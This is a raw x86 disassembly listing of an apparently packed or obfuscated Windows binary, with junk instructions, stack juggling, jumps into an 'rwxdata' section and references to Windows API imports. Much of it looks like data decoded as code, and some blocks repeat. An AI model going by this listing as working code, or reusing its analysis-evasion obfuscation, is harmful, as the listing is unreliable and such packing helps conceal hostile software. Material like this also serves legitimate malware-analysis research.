cmp dh [ ecx + 0x11 ]
add [ eax ] al
add [ eax ] al
add ch cl
arpl [ ecx ] dx
add [ eax + 0x76001177 ] ch
dec esp
adc [ eax ] eax
pop ecx
adc [ eax ] eax
mov [ esi + 0x11 ] gs
add [ ebx + ecx * 2 ] al
adc [ eax ] eax
jg rwxdata
xor ebx [ ecx + 0x11 ]
add [ ecx ] al
pop ecx
adc [ eax ] eax
sub bh bh
or al 0x0
adc [ eax ] eax
sub_5157a0
ror dl 0x2
pushfd
dec dl
clc
stc
mov [ esp ] 0x5d
ror dl 0x6
jmp rwxdata
jmp rwxdata
push esi
push [ esp + 0x16 ]
popf
push 0xaeb192ad
inc esi
pushfd
mov [ esp ] 0x8638
pushfd
push [ esp ]
adc dl dl
lea esp [ esp + 0x28 ]
pushfd
push [ esp + 0x4 ]
retn 0x8
sub_5158f7
clc
pushad
pushfd
test eax eax
jmp rwxdata
call sub_516603
lea esp [ esp + 0x44 ]
ja rwxdata
not bl
test dh 0x55
xchg ebp eax
daa
clc
mov eax ebp
pushad
add bl ah
mov bl 0x1
sub esp 0xffffffe0
pushad
inc ecx
pushfd
inc bl
call sub_4ba811
add [ eax ] al
push edi
jb rwxdata
cmp di 0xba02
cmp si sp
push esi
ror si cl
pushad
mov esi edi
call sub_51578e
add [ eax ] al
dec esi
je rwxdata
push 0xf9efd1ed
mov [ esp ] bp
pushad
mov [ esp + 0x20 ] esi
shr esi cl
lea esi [ eax * 2 - 0x2888c866 ]
mov esi edi
push [ esp ]
call sub_515aa3
popad
je rwxdata
mov ebx [ esi ]
bt esp 0x10
clc
stc
clc
and ebx 0xfff
cmp ah 0x4e
pushfd
stc
clc
add [ edi + ebx ] edx
sub esp 0xfffffff8
imul ebp [ edi + 0x73 ] 0x5ce06100
cmc
fidiv [ ebp - 0x3914778 ]
pop esp
call sub_5191a9
fcmove st5
pop eax
imul esi [ ebx + 0x6b ] 0x65657246
push ebx
jo rwxdata
popad
je rwxdata
inc esi
imul ebp [ ebp ] 0x8246488
lea esp [ esp + 0x44 ]
je rwxdata
pushad
jmp rwxdata
inc ecx
and esi ebp
je rwxdata
and al 0x45
shl [ edi - 0x64 ] 0x3c
bound edi [ eax + edx * 4 + 0xe ]
out dx eax
xchg [ esi ] ch
lea ecx [ edx ]
mov eax [ 0xffffffffff43e6e3 ]
mov esp 0x4ece65cb
shl [ edx - 0xd ] cl
jb rwxdata
add [ eax - 0x58 ] ch
adc al al
jle __import_name_0(KERNEL32:GetCurrentProcess)
jle rwxdata
mov esp 0x4601781d
cmp al 0x69
mov [ 0xffffffffe9ef6996 ] ch
lodsb [ si ]
cmpsd [ esi ] [ edi ]
arpl [ ebp + 0x45 ] sp
js rwxdata
jb rwxdata
bound esp [ ecx + 0x73 ]
add [ gs : esi - 0x75 ] ah
push ds
bt dx ax
bt si 0x9
bt bp 0x3
pushad
shr ebx 0xc
stc
cmp ebx 0x1
call sub_515994
add [ eax ] al
inc edi
je rwxdata
cmp ax cx
setns bl
shrd bx si 0x8
push 0x5fb38d27
mov bx [ esi ]
pushfd
and ebx 0xfff
jmp rwxdata
stc
push 0x36eb56d9
stc
cmp ebx 0x2
push 0xf84f98d
pushad
lea esp [ esp + 0x28 ]
je rwxdata
pushfd
dec ecx
call sub_4baa7e
add [ eax ] al
pop edi
popad
jne rwxdata

test al 0xf7
scasb [ edi ]
retn 0xc088
inc edi
je rwxdata
in al dx
outsd
bswap esi
lahf
cmp al 0x0
add dl bl
int 0x58
mov edi 0x6bd472f
in al 0x62
mov dl 0x70
sti
insb
imul [ edx + 0x7c5df96f ]
mov al 0x27
mov ecx 0x319e2d58
mov eax [ 0xffffffffbc36a200 ]
sbb eax 0x3c460178
imul ecx [ eax - 0x109669d3 ] 0xa7ac67e9
push 0x9447f669
mov ebp 0xd6af0e06
pushfd
cmp [ edi ] eax
add [ ebp - 0x185c2d04 ] ecx
cmpsb [ es : esi ] [ edi ]
sar [ ebp - 0x536ddcb0 ] cl
je rwxdata
add [ ebx - 0x54f099c2 ] cl

salc
arpl [ ebp + 0x73 ] sp
jae rwxdata
test esi ebp
add [ edi + ebx ] ax
pushfd
push [ esp + 0x4 ]
push 0x7ff9b3ca
lea esp [ esp + 0x14 ]
jmp rwxdata
cmp dh dh
shr bl cl
shl bx cl
mov bx [ esi ]
pushfd
and ebx 0xfff
call sub_514f4a
add [ eax ] al
dec ebp
outsd
jne rwxdata
cmc
cmc
cmp ebx 0x3
pushad
call sub_4cd011
lea esp [ esp + 0x24 ]
jae rwxdata
sub bl [ edx ]
lea ecx [ ebx - 0x74fd2acb ]
rcr [ cs : ebx + 0x1a ] cl
pop eax
rwxdata
insb
jae rwxdata
xchg esi eax
imul ebp edi 0xa7ac67e9
jne rwxdata
push 0x7ec010a8
cmp dh ah
bt ax ax
add esi 0x2
jmp rwxdata
mov ebx 0xafc2bff4
ror [ esi - 0x62305f19 ] cl
0x34ffda84 0x8524
[ eax + 0x2c24648d ]
xor esi [ gs : edx ]
dec esi
js rwxdata
jmp rwxdata
jmp rwxdata
arpl [ ebp + 0x70 ] bp
add [ eax ] al
add [ ebx + 0x74 ] dh
jb rwxdata
js rwxdata
jb rwxdata
cli
stc
dec edi
loopne rwxdata
jb rwxdata
rol bl cl
shrd ebx eax 0x16
sub eax eax
sete bl
movzx bx bl
not edi
bswap si
pop ebx
jmp rwxdata
bswap si
ror si cl
btr si bx
sbb esi esi
add edi ebx
sar esi 0x1f
mov esi [ edx ]
cmp ch dh
pushfd
test esi esi
pushad
lea esp [ esp + 0x24 ]
je rwxdata
je rwxdata
xor al 0x24
test edi edi
pushfd
pushad
lea esp [ esp + 0x2c ]
add ah al
jbe rwxdata
push 0xe54feceb
mov [ esp ] 0x9e49
lea esp [ esp + 0x4 ]
call sub_514aff
push 0x73519e81
pushad
adc al al
jmp rwxdata
pushfd
pushad
lea esp [ esp + 0x24 ]
jb rwxdata
and al 0x40
je rwxdata
lahf
retn
inc ebx
or cl [ ebx - 0x52 ]
call sub_5149a7
push 0x2ac01081
call sub_518563
push cs
scasd [ edi ]
salc
sbb dl bh
sub al 0xd3
xchg esp eax
movsd [ edi ] [ esi ]
adc bl [ edi - 0x12 ]
pushfd
mov ebx 0x66909afa
xchg ecx eax
test al 0x38
xchg esi eax
cld
cdq
fsubr st5
outsd
dec eax
mov [ 0xffffffffd2a626e7 ] eax
mov ebp 0xac922350
outsb
je rwxdata
call sub_516af7
adc si dx
clc
stc
add esi ebx
push 0x116783e1
pushfd
lea esp [ esp + 0x8 ]
jmp rwxdata
jne rwxdata
insb
les edi [ ebx - 0x32 ]
push esi
iretd
pushad
push [ esp + 0x4 ]
mov [ esp + 0x8 ] edi
lea esp [ esp + 0x48 ]
jae rwxdata
call j_sub_5156a9
add [ eax ] al
inc edx
imul esi [ edx + eax * 2 + 0x6c ] 0xe9600074
aad 0xf8
jne rwxdata
jmp rwxdata
jmp rwxdata
and al 0x40
add [ eax - 0x2 ] ah
enter 0x9f0f 0xc3
pushad
ror bl cl
mov [ esp + 0x8 ] 0x24
ror al 0x6
pushfd
push 0x3db5ced4
stosb [ edi ]
mov bl ch
mov bl 0x2
lea esp [ esp + 0x4c ]
cmp [ edx + 0x26 ] dh
mov edi 0x68ab77ca
cli
jb rwxdata
add ah 0xd5
shld eax ebx 0x15
mov eax [ edx + 0xc ]
call sub_4ba26d
pushad
jmp rwxdata
jpe rwxdata
pushfd
stosb [ edi ]
mov [ esp ] 0x54f5
push [ esp ]
lea esp [ esp + 0x8 ]
jmp rwxdata
mov bl 0x4a
setb bl
mov bl al
inc ecx
push esi
dec bl
pushfd
inc ecx
add esp 0x8
mov al ch
mov al cl
lodsb [ esi ]
not bl
cmc
not al
jmp rwxdata
pushfd
pushfd
stc
sub ecx ecx
jmp rwxdata
pushfd
jmp rwxdata
pushad
pushfd
lea esp [ esp + 0x24 ]
call sub_514aff
pushfd
push [ esp ]
lea esp [ esp + 0x8 ]
jae rwxdata
ror al 0x2
call sub_515d7b
add [ eax ] al
pop edi
imul ebp [ edi + 0x62 ] 0x7ae96000
lea esp [ esp + 0x8 ]
lea esp [ esp + 0x24 ]
jne rwxdata
pushad
lea esp [ esp + 0x20 ]
jae rwxdata
jmp rwxdata
pushad
lea esp [ esp + 0x20 ]
call sub_516816
push 0x2f36ccdf
push ebx
sub ecx ebx
push [ esp ]
call sub_514f1a
add [ eax ] al
push esi
imul esi [ edx + 0x74 ] 0x466c6175
jb rwxdata
call sub_4ba562
pushfd
call sub_514bca
add [ eax ] al
push edx
jo rwxdata
jmp rwxdata
add [ eax ] al
add al al
add [ edx + esi * 8 + 0x14 ] esp
pop ecx
aas
or al 0x0
add [ eax ] al
inc eax
scasb [ edi ]
mov cl dh
loopne rwxdata
inc ebp
js rwxdata
add al 0xae
jb rwxdata
stosb [ edi ]
pushfd
lea esp [ esp + 0x4 ]
jmp rwxdata
sub al 0x4
add [ eax ] al
loopne rwxdata
pop ecx
aas
or al 0x0
add [ eax ] al
add dh al
or esi ebx
adc [ fs : edx + 0x3f ] 0x58
add [ eax ] eax
add [ eax + 0xc ] dl
mov edi edx
sub al 0x26
pop ecx
aas
or al 0x0
add [ eax ] al
add [ edi + 0x2264fcdc ] ah
pop ecx
aas
clc
push eax
push [ esp + 0x4 ]
xchg [ esp + 0x8 ] ebp
sub bp dx
shl ebp cl
lea ebp [ esp + 0x8 ]
stc
push [ esp ]
bt esi 0x2
cmp esp ecx
mov [ esp + 0x8 ] ecx
mov [ esp + 0x4 ] 0x6b
mov [ esp + 0x4 ] ebx
cmc
bt dx 0x1
or eax eax
call sub_4d126d
lodsb [ esi ]
pushfd
not al
clc
jmp rwxdata
lea eax [ 0x0 ]
mov [ esp ] 0x35
mov [ esp + 0x3c ] rwxdata
jmp rwxdata
pop [ esp + 0x1c ]
pushad
push [ esp ]
jmp rwxdata
clc
inc ebp
jbe rwxdata
inc ebx
aas
out 0x0 eax
add [ eax ] al
jmp rwxdata
salc
clc
hlt
cmc
mov [ esp ] 0x4a54
ror al 0x2
mov [ esp + 0x4 ] bh
dec al
jmp rwxdata
push 0x21193420
call sub_4ba009
add [ eax ] al
inc ebx
jb rwxdata
xchg [ eax - 0x64 ] bl
and [ esi - 0x39 ] ah
inc esp
and al 0x4
scasb [ edi ]
outsb
je rwxdata
jbe rwxdata
cmc
cmc
stc
ror al 0x6
lea esp [ esp + 0x2c ]
jne rwxdata
add [ ebx - 0x5afb46d0 ] ch
jo rwxdata
cdq
xlat
movsb [ edi ] [ esi ]
neg [ ecx - 0x279cc9c7 ]
add [ eax ] al
ja rwxdata
add al ch
out dx al
mov dl 0xfb
jmp [ esi - 0x39 ]
add [ eax ] cl
xor eax 0x7d9bf9ac
lodsd [ esi ]
shl al 0x7c
in al dx
je rwxdata
pop esi
aas
or [ esp + eax ] 0x7
dec ebx
out 0xf2 eax
mov bl 0xf3
inc ebx
aas
cmp eax 0x90000008
pop ss
sub al 0xf1
loopne rwxdata
call sub_4cfe42
mov [ esp ] 0x4e50
add dl dl
lea esp [ esp + 0x4 ]
js rwxdata
call j_sub_51680a
pushfd
mov [ esp ] 0xc4ad
cmp eax 0x7d00
pushfd
pushad
lea esp [ esp + 0x28 ]
jae rwxdata
jmp rwxdata
outsb
inc esp
arpl [ gs : edx + 0x79 ] si
jo rwxdata
je rwxdata
jae rwxdata
mov es sp
pop ss
add eax 0x830ad99d
xchg edi eax
cwde
mov al 0x26
pop ecx
aas
or al 0x0
add [ eax ] al
inc eax
inc ecx
idiv ch
leave
inc ebx
aas
jmp rwxdata
pushfd
push [ esp ]
push 0x42e22958
lea esp [ esp + 0xc ]
jne rwxdata
stc
pushfd
call sub_4cd0f5
sub [ ebp - 0x282051e4 ] bh
in al dx
xchg edx eax
stosd [ edi ]
xor [ ecx + 0x32f1a504 ] bh
int1
xor ah [ eax - 0x51a37b79 ]
add al 0xa5
add [ eax ] al
add [ edi + 0x65 ] al
je rwxdata
je rwxdata
popad
jo rwxdata
je rwxdata
xor al 0xfd
movsd [ edi ] [ esi ]
dec esi
push edi
div [ 0x69d36210 ]
fsubr [ ebp - 0x5809edc ]
mov ecx 0xa2c3bbf9
enter 0x5d3f 0x2f
test edx 0xeb93f012
mov ch 0x27
push 0xffffffda
add [ eax ] al
imul esi [ ebx + 0x73 ] 0x65636170
add [ 0x7f ] bh
push ecx
pushfd
call sub_4d11bc
add [ eax ] al
pop edi
popad
insb
insb
imul esi [ fs : esi ] 0x52c3980f
mov bl 0x2
push 0xe370dce6
push eax
jmp rwxdata
mov [ 0xfffffffff274f6d5 ] al
sub bh [ cs : edi ]
jle rwxdata
add [ eax ] al
add ah ah
inc ebp
xor al [ fs : ebx + 0x3f ]
add [ edx ] al
add [ eax ] al
loopne rwxdata
pushfd
pushad
lea esp [ esp + 0x24 ]
jne rwxdata
pushfd
push [ esp + 0x4 ]
retn 0x8
jmp rwxdata
inc ebx
push edx
push esp
insb
imul ebp [ esi + 0x64 ] 0x4473776f
imul esi [ edx + 0x65 ] 0x726f7463
jns rwxdata
mov ah 0x5a
0xaf298232 0x972a
into
sub ebx esi
0xa7d209b5 0x53f4
jb rwxdata
add [ eax ] al
add [ edi + 0x65 ] al
pop edi
je rwxdata
out 0x42 al
in eax 0x54
test [ ebx ] eax
js rwxdata
add [ eax ] al
add [ ebx + 0x70 ] dh
jb rwxdata
inc ecx
push [ esp + 0x8 ]
pushfd
mov al 0x10
pushfd
jmp rwxdata
inc edx
sahf
imul [ ebp + 0x1d88a34f ]
nop
jo rwxdata
push cs
je rwxdata
or [ eax ] al
add [ eax ] al
in al 0x45
mov edi ebx
nop
stc
inc ebx
aas
test [ ebx ] 0x0
add [ eax + 0x38f2d8fc ] ah
pop ecx
aas
or al 0x0
add [ eax ] al
add dl ch
pop esi
stc
enter 0x5926 0x3f
or al 0x0
add [ eax ] al
inc eax
lds edi [ edx - 0x7 ]
cmp [ ebx + 0x3c3f52 ] al
add [ eax ] al
xor [ edx - 0x6 ] dl
cld
les eax [ ebx + 0x1483f52 ]
add [ eax ] al
pushad
pushf
pop [ esp + 0x1e ]
pushfd
not dl
rcl dl cl
mov dl [ esi ]
jmp rwxdata
call sub_5160c0
fdivr [ eax - 0x29 ]
pop ebp
0x2c6efc40 0xba31
int3
jbe rwxdata
lodsd [ esi ]
add eax 0x56534d00
add [ eax ] al
add [ edi + 0x65 ] al
je rwxdata
mov esp 0x830d700a
and cl ch
jmp rwxdata
imul ebp [ edi + 0x6e ] r-xdata
add [ eax ] al
jo rwxdata
scasd [ edi ]
sub dl [ edi - 0x150cd632 ]
mov ch 0x9
shl [ edi + 0x482053f4 ] cl
xor eax 0xc663e665
jpo rwxdata
inc ebx
add [ ebp + 0x5 ] cl
add dh al
add al 0x24
xor eax 0x3c2444c7
xor ch [ eax + 0x51 ]
add cl ch
inc edi
pop esp
cli
dec [ ebx - 0x14 ]
inc edi
0x859c
add [ eax ] al
jo rwxdata
jae rwxdata
test ecx ecx
rcl [ 0x2b41ffdc ] cl
cmp eax 0xf8ddff8a
mov ebp 0x64e42207
0xd9ba
hlt
outsb
je rwxdata
mov [ esp + 0x4 ] ch
pushad
pop ecx
aas
or al 0x0
add [ eax ] al
shr dl 0x34
clc
pushfd
cli
push ebp
lahf
adc ecx ebx
into
pop edx
test [ edi + 0x4086c7ea ] eax
js rwxdata
not dl
mov [ esp ] 0x7
ror dl 0x2
pushfd
push 0xe79e7e8c
dec dl
bt sp bx
clc
push [ esp + 0x8 ]
ror dl 0x6
std
bt ax bx
cmc
push [ esp + 0x2e ]
popf
pushfd
mov [ esp ] 0x3f
inc esi
jmp rwxdata
mov bl 0x2
push 0xbc73fcd6
push 0xb25f2b2b
inc al
inc ecx
jmp rwxdata
je rwxdata
outsb
insb
add [ eax ] al
add [ ebx + 0x65 ] dl
je rwxdata
insb
jbe rwxdata
je rwxdata
jpe rwxdata
je rwxdata
add [ ecx ] edi
add [ esi + 0x70 ] ah
jne rwxdata
add cl dl
push edi
shr [ eax - 0x31 ] 0x40
jb rwxdata
push [ ebp - 0x8 ]
add [ eax - 0x77 ] ah
inc esp
and al 0x20
mov [ esp + 0x4 ] 0x86ae
pop eax
pushfd
outsb
inc esp
jae rwxdata
jb rwxdata
sub bh [ edi ]
rol [ ecx ] 0x15
adc dl dl
mov [ esp ] bl
pushfd
push esp
pushfd
push [ esp + 0x40 ]
retn 0x44
pushad
jmp rwxdata
jae rwxdata
arpl [ ebp + 0x43 ] sp
popad
jo rwxdata
call sub_514aff
jmp rwxdata
add al 0x51
add [ edi + 0x18 ] eax
imul esi [ 0x24648db4 ] 0x8
inc ecx
xor [ ebx - 0x50c87ee4 ] eax
sub ch cl
mov esp 0xbcaf27cd
or cl al
cdq
popfd
sbb ch bl
xchg edi eax
je rwxdata
arpl [ eax ] ax
add [ eax ] al
inc edi
je rwxdata
0xda80
je rwxdata
mov al 0x10
call sub_515d53
add [ eax ] al
jae rwxdata
outsd
pushfd
adc [ edx ] esi
xchg esi eax
imul edx ecx 0xa7c254e0
in al 0xcf
je rwxdata
xchg ecx eax
add [ ecx + ebp - 0x1 ] edi
add [ eax ] al
add [ esi + 0x66 ] ah
insb
jne rwxdata
setae [ 0xffffffffa81b6c87 ]
test [ ecx ] edi
fmul [ ecx - 0x7ed456cd ]
sahf
push ss
scasd [ edi ]
shr esp 0x1
or [ ecx + 0x3a ] esp
jo rwxdata
out dx al
adc [ eax ] eax
add [ edi - 0x77 ] dl
iretd
jb rwxdata
scasb [ edi ]
add [ ebp + 0x7c019132 ] bl
sub edi edi
add al ch
or [ ebp + 0x534d0005 ] ebp
push esi
mov al [ 0xffffffffae5c8487 ]
dec ebp
aam 0x91
hlt
aad 0x4d
lea esp [ esp + 0x38 ]
call sub_514aff
pushad
adc al al
call sub_4ba21b
add [ eax ] al
dec edi
jo rwxdata
push 0x246c8800
add al 0x60
push eax
sbb cl [ esi - 0x29 ]
sahf
cwde
shr [ ebp + 0x32 ] 0x2c
imul edx [ esi - 0x80 ] 0xffffffd7
or [ ebx ] eax
jne rwxdata
dec esp
cmp ecx [ edx + 0x20 ]
imul eax [ ecx + edx * 2 ] 0x1
inc edi
sbb [ ebx + 0x35 ] ch
mov ah 0x8d
and al 0x8
pop ds
add [ eax ] al
pushad
lea esp [ esp + 0x24 ]
jne rwxdata
jo rwxdata
call sub_515ff7
lea edi [ ecx + 0x791c83a5 ]
and al 0x4
add [ eax ] al
add [ esi + 0x69 ] dl
jb rwxdata
je rwxdata
jns rwxdata
jne rwxdata
das
sahf
add eax 0x63fb557b
cwde
and al 0xa9
sub [ ebx - 0x78b248b7 ] 0x4409
cmp eax 0x7fb6fd05
popad
add al 0x78
outsd
insb
jne rwxdata
sbb ch [ ecx ]
pslld mm7 [ esi ]
add eax 0x3776657f
test al 0x87
inc ecx
inc eax
push ss
ja rwxdata
je rwxdata
test [ edi ] ebx
insb
push eax
jb rwxdata
inc ecx
add [ ebx - 0x21 ] dl
jne rwxdata
insd
add cl ch
mov dh 0x19
add esp eax
push esi
std
jle rwxdata
add [ eax ] al
insd
push esp
imul ebp [ ebp + 0x65 ] 0x19b6e900
mov edi [ esp + 0x8 ]
call sub_5160ed
add [ eax ] al
inc edi
je rwxdata
mov ecx 0x791c83a5
je rwxdata
jb rwxdata
jbe rwxdata
cmp edi [ ecx - 0x6278c946 ]
je rwxdata
retn 0xd248
push edi
mov edi ecx
mov ebx [ esp + 0x4 ]
btc ax 0x1
aaa
mov esi edi
arpl [ eax + eax + 0x66 ] si
adc esi edx
jmp rwxdata
popad
insd
inc ecx
add [ eax + 0x72 ] ch
sbb al 0x13
ja rwxdata
dec eax
pop edi
pop edi
je rwxdata
adc eax 0x4d9c0a5a
in eax dx
std
dec eax
popad
jae rwxdata
sbb al 0xfb
adc [ eax ] eax
xor [ ecx + edx ] bl
cmc
test al 0xb
add [ ecx - 0x60 ] dh
or eax [ eax ]
sub [ ebp + 0x5caf000b ] esp
adc [ eax ] eax
test [ edi + 0x11 ] dh
add bh ch
pop esp
adc [ eax ] eax
outsb
dec esi
adc [ eax ] eax
aam 0xa6
or eax [ eax ]
mov [ ecx + edx ] ch
in al dx
push esp
adc [ eax ] eax
mov [ esi + 0x46b6000b ] fs
adc [ eax ] eax
out dx eax
mov [ 0x6304000b ] eax
adc [ eax ] eax
inc edi
mov al [ 0xffffffffa40d000b ]
or eax [ eax ]
mov eax 0x3e001164
push 0xab0e0011
or eax [ eax ]
and eax 0x5a00115e
jl Heap32ListFirst@IAT
popad
imul ebp [ esi + 0x61 ] 0x736772
push 0x1ac010d0
call sub_518ef7
cmp al 0x30
std
0xfdc0953a 0x7610
add [ eax ] al
add [ edi + 0x65 ] al
je rwxdata
cli
arpl [ ecx ] dx
add [ ebp + 0x64 ] cl
adc [ eax ] eax
popad
mov al [ 0x6435000b ]
adc [ eax ] eax
cmp ebp [ esi + 0x11 ]
add [ ecx + edi * 2 + 0x560b0011 ] dh
adc [ eax ] eax
das
jge GetSystemTime@IAT
add [ ecx + 0x56 ] al
adc [ eax ] eax
pop edi
adc [ eax ] ax
and [ edx + 0x6b06000b ] 0x11
add dl bh
xor ah [ esi - 0x5a ]
int3
jae rwxdata
pop ds
dec esi
adc [ eax ] eax
mov eax [ 0x6b000ba6 ]
mov [ 0xfffffffffed3000b ] eax
or al 0x0
xlat
mov [ 0x11ee000b ] eax
or eax 0x11662600
add bh al
pop ecx
adc [ eax ] eax
adc al 0x5a
adc [ eax ] eax
lds esp [ eax + 0x11 ]
add [ ebx - 0x2affeeac ] bh
pushad
adc [ eax ] eax
dec esi
ror [ eax + eax ] 0x1
push cs
stosb [ edi ]
or eax [ eax ]
cmp [ ebx + 0x75f2000b ] ebp
adc [ eax ] eax
add al 0x7d
adc [ eax ] eax
aas
mov [ 0x7759000b ] al
adc [ eax ] eax
mov eax 0x85000ba6
into
add [ esp ] cl
adc [ eax ] eax
jg rwxdata
jbe rwxdata
jb rwxdata
add [ ecx + 0x11 ] ebx
add [ edx ] ch
dec [ eax + eax ]
add [ eax + 0x29001153 ] ah
push esp
adc [ eax ] eax
pop edx
test eax 0x5933000b
adc [ eax ] eax
js WaitForSingleObject@IAT
add [ ebp - 0x28fff332 ] al
adc [ eax ] eax
lodsd [ esi ]
movsd [ edi ] [ esi ]
or eax [ eax ]
je CreateEventA@IAT
je __import_name_6(MSVCRT:__getmainargs)
mov ecx 0x9d8736ba
push esp
add [ eax ] dl
inc ebx
or al 0x0
xlat
or eax [ eax ]
hlt
cmp [ esi + 0x11 ] edx
add cl al
adc [ 0x115c3e00 ] ecx
add [ edx - 0x2f ] al
or al 0x0
aaa
test al 0xb
add [ edx + 0x5a ] dh
adc [ eax ] eax
cmp dh [ ecx + 0x11 ]
add [ eax ] al
add [ eax ] al
add ch cl
arpl [ ecx ] dx
add [ eax + 0x76001177 ] ch
dec esp
adc [ eax ] eax
pop ecx
adc [ eax ] eax
mov [ esi + 0x11 ] gs
add [ ebx + ecx * 2 ] al
adc [ eax ] eax
jg rwxdata
xor ebx [ ecx + 0x11 ]
add [ ecx ] al
pop ecx
adc [ eax ] eax
sub bh bh
or al 0x0
adc [ eax ] eax
sub_515950
push esp
mov [ esp ] al
mov [ esp ] 0x60
lea esp [ esp + 0x34 ]
je rwxdata
cmp ax cx
setns bl
shrd bx si 0x8
push 0x5fb38d27
mov bx [ esi ]
pushfd
and ebx 0xfff
jmp rwxdata
call sub_514efb
add [ eax ] al
push edx
insb
popad
jae rwxdata
test esi ebp
add [ edi + ebx ] ax
pushfd
push [ esp + 0x4 ]
push 0x7ff9b3ca
lea esp [ esp + 0x14 ]
jmp rwxdata
bound esi [ ebp + 0x74 ]
jae rwxdata
inc esp
inc ebx
add [ eax - 0x17 ] ah
js __export_name_ptr_table_0(KERNEL32:GetFileAttributesExA)
cmp dh ah
bt ax ax
add esi 0x2
jmp rwxdata
add cl al
call 0xffffffff844b5339
add [ edi ] cl
mov [ ebp - 0x1 ] ds
js rwxdata
add [ eax ] al
inc edi
je rwxdata
cli
call [ edi - 0x18 ]
jge rwxdata
pushad
jmp rwxdata
dec ebp
add cl ch
add [ eax ] al
add [ ebx + 0x65 ] dl
je rwxdata
imul ebp [ ebp + 0x41 ] 0x69727474
pushad
jmp rwxdata
add [ eax ] al
add [ eax ] al
push esp
push 0x64616572
xor esi [ edx ]
dec esi
js __import_name_6(MSVCRT:_iob)
pushfd
dec ecx
call sub_4baa7e
add [ eax ] al
pop edi
popad
jne rwxdata
not bx
jb rwxdata
lea esp [ esp + 0x20 ]
je rwxdata
pop edi
imul ebp [ edi + 0x62 ] 0x7ae96000
add [ eax - 0x17 ] ah
mov ecx 0xe800000c

sub bl [ edx ]
lea ecx [ ebx - 0x74fd2acb ]
rcr [ cs : ebx + 0x1a ] cl
pop eax
rwxdata
insb
jae rwxdata
shl bh 0x7
add esi 0x8
bsf bx si
bswap bx
xor bl 0x2c
mov bx [ esi ]
cmc
cmp ch 0xcd
shr ebx 0xc
stc
stc
cmp ebx 0x1
push ebp
jmp rwxdata
jo rwxdata
outsd
jb rwxdata
not bl
not cx
push esi
pushfd
mov ebx [ esp + 0x8 ]
mov [ esp + 0x4 ] bh
setns cl
mov ecx [ esp + 0xc ]
pushfd
call j_sub_4cfe36
add cl 0xde
call sub_4ba5ea
arpl [ ebp + 0x70 ] bp
add [ eax ] al
add [ ebx + 0x74 ] dh
jb rwxdata
js rwxdata
jb rwxdata
mov [ esp + 0x8 ] ah
lea esp [ esp + 0x44 ]
je rwxdata
pushad
add edi [ ebp - 0x4 ]
shl bl 0x7
or bl 0xbf
jmp rwxdata
mov edi [ esi ]
not bx
jns rwxdata
mov edi 0xfa4a92e9
inc [ eax ]
add [ ebx + 0x72 ] al
popad
je rwxdata
outsd
and al 0x40
je rwxdata
lahf
retn
inc ebx
or cl [ ebx - 0x52 ]
call sub_5149a7
push 0x2ac01081
call sub_518563
stc
push 0x36eb56d9
stc
cmp ebx 0x2
push 0xf84f98d
pushad
lea esp [ esp + 0x28 ]
je rwxdata
add [ esi + 0x73 ] ah
imul eax [ gs : eax ] 0x0
add [ edi + 0x61 ] bl
arpl [ ebp + 0x64 ] bp
insb
outsb
add [ ecx ] ch
jne rwxdata
push eax
jb rwxdata
jmp rwxdata
jmp rwxdata
and al 0x40
add [ eax - 0x2 ] ah
enter 0x9f0f 0xc3
pushad
ror bl cl
mov [ esp + 0x8 ] 0x24
ror al 0x6
pushfd
push 0x3db5ced4
stosb [ edi ]
mov bl ch
mov bl 0x2
lea esp [ esp + 0x4c ]
cmp dh dh
shr bl cl
shl bx cl
mov bx [ esi ]
pushfd
and ebx 0xfff
call sub_514f4a
add [ eax ] al
dec ebp
outsd
jne rwxdata
cmc
cmc
cmp ebx 0x3
pushad
call sub_4cd011
lea esp [ esp + 0x24 ]
jae rwxdata
shr cl 0xbb
inc [ eax ]
add [ ecx + ebp * 2 + 0x6d ] dh
add dl ch
xlat
pop esp
fimul [ ecx + esi * 8 + 0x6e ]
jecxz rwxdata
arpl [ ebp + 0x73 ] sp
jae rwxdata
mov bl 0x4a
setb bl
mov bl al
inc ecx
push esi
dec bl
pushfd
inc ecx
add esp 0x8
not bl
test dh 0x55
xchg ebp eax
daa
clc
mov eax ebp
pushad
add bl ah
mov bl 0x1
sub esp 0xffffffe0
mov al ch
mov al cl
lodsb [ esi ]
not bl
cmc
not al
jmp rwxdata
pushfd
pushfd
stc
sub ecx ecx
jmp rwxdata
mov ebx 0xafc2bff4
ror [ esi - 0x62305f19 ] cl
0x34ffda84 0x8524
[ eax + 0x2c24648d ]
xor esi [ gs : edx ]
dec esi
js rwxdata
jmp rwxdata
jmp rwxdata
inc edi
ficomp [ ebx + edx * 4 ]
inc edi
test [ eax ] edi
xchg ecx eax
not [ ebp - 0x3e ]
in eax 0x75
fwait
jne rwxdata
add [ eax - 0x2e ] ch
adc al al
push ds
call sub_5183e2
std
cmp di 0xba02
cmp si sp
push esi
ror si cl
pushad
mov esi edi
call sub_51578e
add [ eax ] al
dec esi
je rwxdata
push 0xf9efd1ed
mov [ esp ] bp
pushad
mov [ esp + 0x20 ] esi
shr esi cl
lea esi [ eax * 2 - 0x2888c866 ]
mov esi edi
push [ esp ]
call sub_515aa3
ror al 0x2
call sub_515d7b
add [ eax ] al
lea esp [ esp + 0x8 ]
rol bl cl
shrd ebx eax 0x16
sub eax eax
sete bl
movzx bx bl
not edi
bswap si
pop ebx
jmp rwxdata
bswap si
ror si cl
btr si bx
sbb esi esi
add edi ebx
sar esi 0x1f
mov esi [ edx ]
cmp ch dh
pushfd
test esi esi
pushad
lea esp [ esp + 0x24 ]
je rwxdata
je rwxdata
xor al 0x24
test edi edi
pushfd
pushad
lea esp [ esp + 0x2c ]
add ah al
jbe rwxdata
push 0xe54feceb
mov [ esp ] 0x9e49
lea esp [ esp + 0x4 ]
call sub_514aff
push 0x73519e81
pushad
adc al al
jmp rwxdata
pushfd
pushad
lea esp [ esp + 0x24 ]
jb rwxdata
jae rwxdata
jmp [ eax + 0x68 ]
mov ebx [ esi ]
bt esp 0x10
clc
stc
clc
and ebx 0xfff
cmp ah 0x4e
pushfd
stc
clc
add [ edi + ebx ] edx
sub esp 0xfffffff8
imul ebp [ edi + 0x73 ] 0x5ce06100
cmc
fidiv [ ebp - 0x3914778 ]
pop esp
pushad
lea esp [ esp + 0x20 ]
jae rwxdata
call sub_516af7
adc si dx
clc
stc
add esi ebx
push 0x116783e1
pushfd
lea esp [ esp + 0x8 ]
jmp rwxdata
jne rwxdata
insb
les edi [ ebx - 0x32 ]
push esi
iretd
pushad
push [ esp + 0x4 ]
mov [ esp + 0x8 ] edi
lea esp [ esp + 0x48 ]
jae rwxdata
call j_sub_5156a9
add [ eax ] al
inc edx
